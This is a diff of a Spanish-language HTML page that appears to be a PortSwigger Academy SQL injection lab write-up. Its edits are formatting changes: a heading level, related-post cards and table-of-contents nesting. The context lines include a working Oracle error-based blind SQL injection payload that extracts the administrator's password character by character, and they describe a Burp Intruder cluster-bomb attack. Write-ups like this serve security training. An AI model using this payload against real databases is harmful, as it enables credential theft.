@@ -186,7 +186,7 @@
 	<figcaption>Ataque con intruder</figcaption>
 	
 </figure></p>
-<h3 id="recuperar-la-contrasena">Recuperar la contrasena</h3>
+<h4 id="recuperar-la-contrasena">Recuperar la contrasena</h4>
 <p>Ahora que sabemos el tamano ya podemos enviar la peticion para recuperarla, ahora para recuperar la contrasena utilizaremos la siguiente consulta para inyectar:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="n">xxxxx</span><span class="s1">&#39; AND (SELECT CASE WHEN ((select SUBSTR(password, 1, 1) from users where username=&#39;</span><span class="n">administrator</span><span class="s1">&#39;)=&#39;</span><span class="n">a</span><span class="s1">&#39;) THEN to_char(1/0) ELSE &#39;</span><span class="n">a</span><span class="s1">&#39; END FROM dual)=&#39;</span><span class="n">a</span><span class="w">
 </span></code></pre></div><p>Ahora vamos a realizar un ataque de clusterbomb enviando en el primer parametro el valor que cambiara de 1 a 20 y en el segundo un caracter alfanumerico.</p>
@@ -294,6 +294,28 @@
                 
                     
 <article class="has-image">
+    <a href="/p/portswigger-academy-learning-path-sql-injection-lab-13/">
+        
+        
+            <div class="article-image">
+                <img src="/p/portswigger-academy-learning-path-sql-injection-lab-13/head.a629808d3c419c422297aa6a9115b9dd_huc76dcbe4719eea5620ad72b9e0798e52_74880_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy" 
+                        data-key="" 
+                        data-hash="md5-pimAjTxBnEIil6pqkRW53Q==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Portswigger Academy Learning Path: SQL Injection Lab 13</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
     <a href="/p/portswigger-academy-learning-path-sql-injection-lab-10/">
         
         
@@ -376,28 +398,6 @@
 
         <div class="article-details">
             <h2 class="article-title">Portswigger Academy Learning Path: SQL Injection Lab 9</h2>
-        </div>
-    </a>
-</article>
-                
-                    
-<article class="has-image">
-    <a href="/p/portswigger-academy-learning-path-sql-injection-lab-3/">
-        
-        
-            <div class="article-image">
-                <img src="/p/portswigger-academy-learning-path-sql-injection-lab-3/head.a629808d3c419c422297aa6a9115b9dd_huc76dcbe4719eea5620ad72b9e0798e52_74880_250x150_fill_box_smart1_3.png" 
-                        width="250" 
-                        height="150" 
-                        loading="lazy" 
-                        data-key="" 
-                        data-hash="md5-pimAjTxBnEIil6pqkRW53Q==">
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">Portswigger Academy Learning Path: SQL Injection Lab 3</h2>
         </div>
     </a>
 </article>
@@ -530,9 +530,9 @@
         <li><a href="#payloads">Payloads</a>
           <ol>
             <li><a href="#recuperar-tamano-de-contrasena">Recuperar tamano de contrasena</a></li>
+            <li><a href="#recuperar-la-contrasena">Recuperar la contrasena</a></li>
           </ol>
         </li>
-        <li><a href="#recuperar-la-contrasena">Recuperar la contrasena</a></li>
       </ol>
     </li>
   </ol>
